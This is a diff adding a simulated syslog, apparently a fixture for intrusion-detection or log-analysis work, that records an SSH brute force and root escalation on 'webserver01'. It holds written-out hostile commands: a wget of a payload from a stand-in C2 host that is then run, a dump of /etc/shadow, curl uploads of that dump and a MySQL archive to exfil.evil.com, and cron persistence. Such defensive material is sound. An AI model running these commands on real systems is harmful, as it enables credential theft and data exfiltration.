@@ -1,0 +1,24 @@
+Mar 17 08:00:01 webserver01 sshd[12345]: Failed password for root from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:02 webserver01 sshd[12346]: Failed password for root from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:03 webserver01 sshd[12347]: Failed password for root from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:04 webserver01 sshd[12348]: Failed password for root from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:05 webserver01 sshd[12349]: Failed password for root from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:06 webserver01 sshd[12350]: Failed password for admin from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:07 webserver01 sshd[12351]: Failed password for admin from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:08 webserver01 sshd[12352]: Failed password for admin from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:09 webserver01 sshd[12353]: Accepted password for admin from 185.234.72.19 port 22 ssh2
+Mar 17 08:00:10 webserver01 sshd[12354]: pam_unix(sshd:session): session opened for user admin
+Mar 17 08:01:15 webserver01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+Mar 17 08:01:30 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:xx:xx:xx SRC=10.0.0.50 DST=10.0.0.1 PROTO=TCP SPT=44231 DPT=3389
+Mar 17 08:02:00 webserver01 bash[12400]: admin executed: wget http://malware-c2.evil.com/payload.sh -O /tmp/.hidden_payload
+Mar 17 08:02:05 webserver01 bash[12401]: admin executed: chmod +x /tmp/.hidden_payload
+Mar 17 08:02:06 webserver01 bash[12402]: admin executed: /tmp/.hidden_payload
+Mar 17 08:03:00 webserver01 bash[12403]: admin executed: cat /etc/shadow > /tmp/.shadow_dump
+Mar 17 08:03:30 webserver01 bash[12404]: admin executed: curl -X POST http://exfil.evil.com/upload -d @/tmp/.shadow_dump
+Mar 17 08:04:00 webserver01 sshd[12405]: Accepted publickey for admin from 10.0.0.50 port 45231 ssh2
+Mar 17 08:04:05 webserver01 bash[12406]: admin executed: ssh admin@10.0.0.100 'cat /etc/passwd'
+Mar 17 08:04:10 webserver01 bash[12407]: admin executed: ssh admin@10.0.0.101 'cat /etc/passwd'
+Mar 17 08:04:15 webserver01 bash[12408]: admin executed: ssh admin@10.0.0.102 'cat /etc/passwd'
+Mar 17 08:05:00 webserver01 bash[12409]: admin executed: tar czf /tmp/.data_archive.tar.gz /var/lib/mysql/
+Mar 17 08:05:30 webserver01 bash[12410]: admin executed: curl -X POST http://exfil.evil.com/upload -d @/tmp/.data_archive.tar.gz
+Mar 17 08:06:00 webserver01 crontab[12411]: (admin) REPLACE (admin) - added cron: */5 * * * * /tmp/.hidden_payload
